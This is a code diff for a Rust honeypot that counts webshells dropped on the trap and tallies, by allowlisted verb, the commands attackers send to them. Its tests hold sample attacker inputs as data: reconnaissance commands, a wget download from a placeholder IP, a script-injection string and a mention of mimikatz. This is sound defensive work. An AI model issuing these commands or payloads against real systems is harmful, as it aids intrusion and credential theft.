@@ -172,6 +172,13 @@ pub struct Stats {
     /// The AI decoys' aggregates; only from [`super::decoys::AI_TILE_MIN`]
     /// requests up.
     pub ai_decoys: Option<super::decoys::AiDecoys>,
+    /// Files dropped on the trap in the range (MIK-121), counted once their
+    /// request is released to this audience.
+    pub webshells_dropped: i64,
+    /// The commands sent to dropped webshells in the range, by verb: only
+    /// the names on [`crate::trap::webshell::verb`]'s list, else `other`.
+    /// Most frequent first.
+    pub verbs: Vec<Named>,
 }
 
 /// Most rows "Recent requests" can show (`[public] recent_rows` is at most
@@ -558,6 +565,8 @@ impl Store {
             )
             .await?;
         let ai_decoys = self.ai_decoys_as(r, a).await?;
+        let webshells_dropped = self.webshells_dropped_as(r, a).await?;
+        let verbs = self.webshell_verbs_as(r, a).await?;
         let sum = self.canary_summary_as(r, a).await?;
         // Counted per harvest, not per value: one request carrying many
         // values of one decoy is one event.
@@ -593,7 +602,64 @@ impl Store {
             canaries,
             tarpit_held_ms,
             ai_decoys,
+            webshells_dropped,
+            verbs,
         })
+    }
+
+    /// Uploads in the range. The public counts one only once the request
+    /// that carried it is released, so a drop shows no sooner than its
+    /// request does.
+    async fn webshells_dropped_as(&self, r: Range, a: Audience) -> Result<i64> {
+        let (w, since) = r.ts_clause("u.ts");
+        let released = match a {
+            Audience::Admin => String::new(),
+            Audience::Public => format!(
+                " AND EXISTS (SELECT 1 FROM requests r WHERE r.uid = u.request_uid{})",
+                a.released("r")
+            ),
+        };
+        self.count_where(
+            &format!("SELECT COUNT(*) FROM uploads u WHERE 1=1{w}{released}"),
+            since,
+        )
+        .await
+    }
+
+    /// The verbs of the commands sent to dropped webshells in the range,
+    /// counted in Rust over the few requests answered as one (read row by
+    /// row, so their bodies never sit in memory together).
+    async fn webshell_verbs_as(&self, r: Range, a: Audience) -> Result<Vec<Named>> {
+        use futures::TryStreamExt;
+        let (w, since) = r.ts_clause("r.ts");
+        let w = w + &a.released("r");
+        let sql = format!(
+            "SELECT r.query, r.body FROM requests r WHERE r.answer = 'webshell'{w}"
+        );
+        let mut rows = bind_since!(
+            sqlx::query_as::<_, (Option<String>, Option<Vec<u8>>)>(sqlx::AssertSqlSafe(
+                sql.as_str()
+            )),
+            since
+        )
+        .fetch(&self.read);
+        let mut counts: HashMap<&'static str, i64> = HashMap::new();
+        while let Some((query, body)) = rows.try_next().await? {
+            if let Some(cmd) =
+                crate::trap::webshell::extract_command(query.as_deref(), body.as_deref())
+            {
+                *counts.entry(crate::trap::webshell::verb(&cmd)).or_default() += 1;
+            }
+        }
+        let mut verbs: Vec<Named> = counts
+            .into_iter()
+            .map(|(name, count)| Named {
+                name: name.to_string(),
+                count,
+            })
+            .collect();
+        verbs.sort_by(|x, y| y.count.cmp(&x.count).then_with(|| x.name.cmp(&y.name)));
+        Ok(verbs)
     }
 
     /// The timeline (hourly or daily, as the range wants) with each bucket
@@ -1579,6 +1645,70 @@ mod tests {
         assert_eq!(m.countries.get("DE"), Some(&1));
         let m = s.map_counts_as(Range::H24, Audience::Public).await.unwrap();
         assert_eq!(m.countries.get("US"), None);
+    }
+
+    async fn webshell_hit(s: &Store, query: Option<&str>, body: Option<&[u8]>) {
+        let ip = s.upsert_ip("198.51.100.7".parse().unwrap()).await.unwrap();
+        s.insert_request(&NewRequest {
+            ip_id: ip.id,
+            method: if body.is_some() { "POST" } else { "GET" }.into(),
+            path: "/s.php".into(),
+            query: query.map(str::to_string),
+            body: body.map(<[u8]>::to_vec),
+            headers_json: "[]".into(),
+            labels_json: "[]".into(),
+            answer: Some("webshell".into()),
+            ..Default::default()
+        })
+        .await
+        .unwrap();
+    }
+
+    #[tokio::test]
+    async fn public_webshell_tiles_exclude_rows_inside_the_delay() {
+        let dir = tempfile::tempdir().unwrap();
+        let s = Store::connect(&dir.path().join("t.db")).await.unwrap();
+        crate::store::uploads::seed_upload(&s, "203.0.113.5", "/a.php", b"<?php a").await;
+        webshell_hit(&s, Some("cmd=id"), None).await;
+        s.set_publish_delay(Duration::from_secs(300), Duration::ZERO)
+            .await
+            .unwrap();
+        crate::store::uploads::seed_upload(&s, "203.0.113.6", "/b.php", b"<?php b").await;
+        webshell_hit(&s, Some("cmd=whoami"), None).await;
+        for r in Range::ALL {
+            let p = s.stats_as(r, Audience::Public).await.unwrap();
+            assert_eq!(p.webshells_dropped, 1, "{r:?}");
+            let names: Vec<_> = p.verbs.iter().map(|n| (n.name.as_str(), n.count)).collect();
+            assert_eq!(names, [("id", 1)], "{r:?}");
+            let a = s.stats_as(r, Audience::Admin).await.unwrap();
+            assert_eq!(a.webshells_dropped, 2, "{r:?}");
+            assert_eq!(a.verbs.len(), 2, "{r:?}");
+        }
+    }
+
+    #[tokio::test]
+    async fn verb_tile_names_only_the_list_and_other() {
+        let dir = tempfile::tempdir().unwrap();
+        let s = Store::connect(&dir.path().join("t.db")).await.unwrap();
+        for q in [
+            "cmd=%2Fbin%2Fls+-la",
+            "c=ID",
+            "cmd=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+            "cmd=mimikatz.exe",
+            "x=wget+http%3A%2F%2F198.51.100.9%2Fx",
+            "page=1",
+        ] {
+            webshell_hit(&s, Some(q), None).await;
+        }
+        webshell_hit(&s, None, Some(b"cmd=uname+-a")).await;
+        let st = s.stats_as(Range::H24, Audience::Public).await.unwrap();
+        let got: Vec<_> = st.verbs.iter().map(|n| (n.name.as_str(), n.count)).collect();
+        assert_eq!(
+            got,
+            [("other", 2), ("id", 1), ("ls", 1), ("uname", 1), ("wget", 1)]
+        );
+        // Nothing the attacker typed shows unless it is a listed verb.
+        assert!(st.verbs.iter().all(|n| !n.name.contains('<') && n.name != "mimikatz.exe"));
     }
 
     #[tokio::test]
